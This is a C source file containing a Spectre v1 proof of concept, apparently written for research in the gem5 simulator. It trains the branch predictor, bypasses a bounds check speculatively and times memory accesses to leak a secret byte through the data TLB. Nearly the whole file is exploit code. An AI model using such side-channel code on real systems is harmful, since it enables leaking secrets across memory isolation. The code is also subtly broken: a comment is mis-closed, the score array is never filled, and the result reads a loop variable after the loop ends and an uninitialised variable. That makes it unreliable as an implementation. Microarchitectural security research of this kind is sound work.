#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif

#include "gem5/m5ops.h"

/*
 * Spectre v1 attack code adapted from Erik August's version at
 * https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6
 * 
 * Speculatively bypasses a bounds check to leak a memory-based secret
 * through the d-TLB using a speculative store.
 * /

/********************************************************************
Victim code.
********************************************************************/
#define STEP_SIZE 4096

#define clflush __builtin_ia32_clflush

#define TLB_LOG_EVENT_CODE_ENABLE 42
#define TLB_LOG_EVENT_CODE_DISABLE 43

unsigned int array1_size = 256;
uint8_t unused1[64];
uint8_t array1[256] = {0};
uint8_t unused2[64];
uint8_t array2[256 * STEP_SIZE];
uint8_t unused3[64];
uint8_t array3[256 * STEP_SIZE];

char * secret = "*";

uint8_t temp = 0;

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

#define NUM_TRIALS 1

void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
  static int results[256];
  int tries, i, j, k, mix_i, junk = 0;
  size_t training_x, x;
  register uint64_t time1, time2;
  uint64_t average_times[256];
  volatile uint8_t * addr;

  for (i = 0; i < 256; i++) {
    results[i] = 0;
    average_times[i] = 0;
  }
    /* m5_work_begin(42,0); */
  for (i = 0; i < 256; i++) {
      for (tries = NUM_TRIALS; tries > 0; tries--) {
        training_x = tries % array1_size;
        for (j = 6; j >= 0; j--) {
          // flushes TLB
          for (int k = 0; k < 64; k++) {
            array3[k] = temp;
          }
          // for cache delay
          clflush( & array1_size);
          for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */

          /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
          /* Avoid jumps in case those tip off the branch predictor */
          x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
          x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
          x = training_x ^ (x & (malicious_x ^ training_x));

          /* Call the victim! */
          if (x < array1_size) {
            array2[array1[x] * STEP_SIZE] = 0;
          }

        }
      }
    m5_work_begin(TLB_LOG_EVENT_CODE_ENABLE,0);
      addr = & array2[i * STEP_SIZE];
      time1 = __rdtscp( & junk); /* READ TIMER */
      junk = * addr; /* MEMORY ACCESS TO TIME */
      time2 = __rdtscp( & junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
      average_times[i] += time2;
    m5_work_begin(TLB_LOG_EVENT_CODE_DISABLE,0);

  }
  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
  value[0] = (uint8_t) j;
  score[0] = results[j];
  value[1] = (uint8_t) k;
  score[1] = results[k];
}

int main(int argc,
  const char * * argv) {
  size_t malicious_x = (size_t)(secret - (char * ) array1);
  int i, score[2], len = 1;
  uint8_t value[2];

  for (i = 0; i < sizeof(array2); i++)
    array2[i] = 1;
  if (argc == 3) {
    sscanf(argv[1], "%p", (void * * )( & malicious_x));
    malicious_x -= (size_t) array1;
    sscanf(argv[2], "%d", & len);
  }

  readMemoryByte(malicious_x++, value, score);

  for (i = 0; i < 256; i++) {
    printf( "array2[%i * STEP_SIZE] @ %p\n", i,  &array2[i * STEP_SIZE] );
  }
  return (0);
}
